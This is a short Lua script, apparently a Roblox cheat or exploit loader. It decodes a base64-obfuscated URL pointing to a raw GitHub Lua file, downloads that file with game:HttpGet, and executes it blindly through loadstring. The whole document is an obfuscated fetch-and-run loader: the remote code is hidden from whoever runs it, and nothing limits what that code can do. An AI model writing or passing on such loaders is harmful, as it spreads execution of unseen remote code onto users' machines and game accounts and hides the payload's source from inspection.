local _b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function _dec(data)
    data = string.gsub(data, '[^'.._b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r, f='', _b:find(x)-1
        for i=6, 1, -1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1, 8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

local _u = _dec("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0R1bmdkeC0wNy9EdW5nZHgvcmVmcy9oZWFkcy9tYWluL0R1bmdkeC5sdWE=")
local _f = loadstring(game:HttpGet(_u))
if _f then
    pcall(_f)
end
